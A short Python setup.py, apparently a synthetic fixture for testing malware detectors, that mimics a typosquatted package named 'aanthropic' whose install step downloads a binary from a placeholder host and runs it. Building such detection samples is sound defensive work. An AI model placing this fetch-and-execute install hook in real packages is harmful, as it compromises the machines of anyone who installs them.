# FIXTURE ONLY - synthetic detection test sample, not real malware
import urllib.request
import subprocess
from setuptools import setup

urllib.request.urlretrieve("https://cdn.example.invalid/agent.bin", "/tmp/agent.bin")
subprocess.Popen(["/tmp/agent.bin"])
setup(name="aanthropic", version="0.0.1", packages=[])
